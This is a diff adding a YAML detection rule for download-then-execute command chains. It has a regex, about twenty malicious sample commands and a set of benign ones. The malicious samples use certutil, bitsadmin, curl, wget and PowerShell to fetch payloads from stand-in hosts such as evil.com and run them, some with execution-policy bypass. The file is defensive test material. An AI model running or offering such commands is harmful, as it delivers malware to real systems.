@@ -1,0 +1,48 @@
+name: high-09-command-chain
+severity: high
+description: >
+  Detects download commands chained with execution. Multi-stage attack pattern for automated payload delivery.
+
+pattern: |
+  (?i)(certutil|bitsadmin|curl|wget|powershell|IWR).{0,200}(https?://|ftp://).{0,150}(&&|\|\||;|&\s|\|).{0,80}(cmd|powershell|bash|sh|rundll32|regsvr32|mshta|wscript|cscript|start|\.exe|\.dll|\.bat|\.sh)
+
+malicious:
+  - "certutil -urlcache -f http://evil.com/malware.exe C:\\malware.exe && C:\\malware.exe"
+  - 'powershell -c "IWR http://evil.com/p.ps1 -OutFile p.ps1" && powershell -ExecutionPolicy Bypass p.ps1'
+  - "curl http://malware.com/bad.dll -o bad.dll && rundll32 bad.dll,EntryPoint"
+  - "bitsadmin /transfer job http://evil.com/trojan.exe trojan.exe && cmd /c trojan.exe"
+  - "wget http://evil.com/payload.sh -O payload.sh && bash payload.sh"
+  - "certutil -urlcache http://evil.com/evil.dll evil.dll && regsvr32 evil.dll"
+  - "powershell IWR http://evil.com/script.ps1 -OutFile s.ps1 && powershell s.ps1"
+  - "wget http://evil.com/dropper.hta -O d.hta && mshta d.hta"
+  - "curl http://attacker.com/backdoor.exe -o C:\\Temp\\backdoor.exe && C:\\Temp\\backdoor.exe"
+  - "certutil -urlcache -f http://evil.com/payload.exe payload.exe && start payload.exe"
+  - "powershell IWR http://malware.com/mal.ps1 -OutFile mal.ps1 && powershell -nop -ep bypass mal.ps1"
+  - "wget http://evil.com/exploit.sh && sh exploit.sh"
+  - "curl http://attacker.com/trojan.dll -o trojan.dll && regsvr32 /s trojan.dll"
+  - "bitsadmin /transfer job http://evil.com/clickfix.exe clickfix.exe && clickfix.exe"
+  - "certutil -urlcache -f http://evil.com/malware.vbs malware.vbs && wscript malware.vbs"
+  - "powershell IWR http://evil.com/backdoor.exe -OutFile backdoor.exe && .\\backdoor.exe"
+  - "curl http://evil.com/payload.sh | bash"
+  - "certutil -urlcache -f http://attacker.com/mal.exe mal.exe; mal.exe"
+  - "wget http://evil.com/reverse.sh -O /tmp/r.sh && chmod +x /tmp/r.sh && /tmp/r.sh"
+  - "curl -o C:\\Temp\\evil.exe http://malware.com/evil.exe && C:\\Temp\\evil.exe"
+
+benign:
+  - "curl https://setup.company.com/installer.exe -o installer.exe"
+  - "powershell -File download_update.ps1"
+  - 'echo "Hello" && powershell Get-Process'
+  - "dir && cmd /c echo done"
+  - "ls -la && pwd"
+  - "Get-Process && Get-Service"
+  - "curl http://example.com/data.json"
+  - 'powershell -Command "Get-Date"'
+  - "wget https://releases.ubuntu.com/20.04/ubuntu.iso && echo 'Download complete'"
+  - "curl http://api.github.com/repos/user/repo && echo done"
+  - "certutil -hashfile downloaded.exe SHA256 && echo verified"
+  - "bitsadmin /list && echo Status checked"
+  - "powershell Get-Service && cmd /c echo Services listed"
+  - "ls && cat file.txt"
+  - "dir C:\\Temp && powershell Get-ChildItem"
+  - "curl https://internal.company.com/api/health && echo OK"
+  - "echo Starting process && start notepad.exe"
